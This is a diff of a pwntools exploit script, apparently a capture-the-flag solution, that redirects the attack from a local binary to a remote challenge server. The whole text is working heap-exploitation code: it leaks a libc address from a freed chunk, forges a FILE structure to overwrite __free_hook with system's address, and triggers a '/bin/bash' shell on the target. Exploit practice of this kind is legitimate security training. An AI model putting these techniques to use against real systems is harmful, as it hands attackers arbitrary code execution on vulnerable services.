@@ -1,5 +1,6 @@
 import pwn
-proc = pwn.process(["./chal"])
+#proc = pwn.process(["./chal"])
+proc = pwn.remote("edu-ctf.zoolab.org", 10011)
 def sendindex(idx:int):
     proc.sendlineafter(b"index\n> ", str(idx).encode())
 
@@ -38,10 +39,11 @@ def main():
     # obtain previous freed unsorted bin chunk
     edit_user(1, 0x199, b"s"*9)
     proc.sendlineafter(b"> ", b"4")
-    
-    leak_addr = pwn.u64(proc.recvuntil(b"1.")[20:25] + b"\x00" * 3)
+    raw_msg = proc.recvuntil(b"1.")
+    print(raw_msg)
+    leak_addr = pwn.u64(b"\x00" + raw_msg[20:25] + b"\x00" * 2)
     print(f"leaked addr: {hex(leak_addr)}")
-    libc_base = leak_addr - (0x7ffff7fbe2 - 0x007ffff7dd1000)
+    libc_base = leak_addr - 2019840
     print(f"libc base: {hex(libc_base)}")
     free_hook = libc_base + 2027080
     print(f"free hook addr: {hex(free_hook)}")
@@ -64,15 +66,27 @@ def main():
     payload += b"\x00" * 8                           # write_ptr 
     payload += b"\x00" * 8                           # write_end
     payload += (free_hook).to_bytes(8, "little")        # buf_base
-    payload += (leak_addr + offset + 0x8).to_bytes(8, "little") # buf_end
+    payload += (free_hook + 0x87).to_bytes(8, "little") # buf_end
     payload += b"\x00" * 8 * 5 # save_base + backup_base + save_end + markers + chain
     payload += int(0).to_bytes(8, "little")          # fd
-    # obtain 2's FILE* & set write addr to IO_file_jump
+    payload += b"\x00" * 8 * 2
+    #payload += (0x1e0 - 16 + 8 - len(payload)) * b"\x00"
+
+    # obtain 2's FILE* & set write addr to __free_hook
     edit_user(3, 0x1e0 - 16 + 8, payload)
-    #input("> b4 send")
-    #proc.sendlineafter(b"> ", b"4")
-    #proc.sendlineafter(b"data: ", b"j"*8)
-    proc.interactive(prompt="")
+    proc.sendlineafter(b"> ", b"4")
+    data = 405 * b"z" + pwn.p64(336528 + libc_base)
+    print(f"system addr:{hex(336528 + libc_base)}")
+    data += (0x200 - len(data)) * b"a"
+    # since duplicated pointer :P
+    proc.sendafter(b"data: ", data)
+    proc.sendafter(b"data: ", data)
+    
+    # trigger free hook
+    add_user(0, "/bin/bash")
+    proc.sendafter(b"> ", b"3")
+    sendindex(0)
+    proc.interactive()
 
 if __name__ == "__main__":
     main()
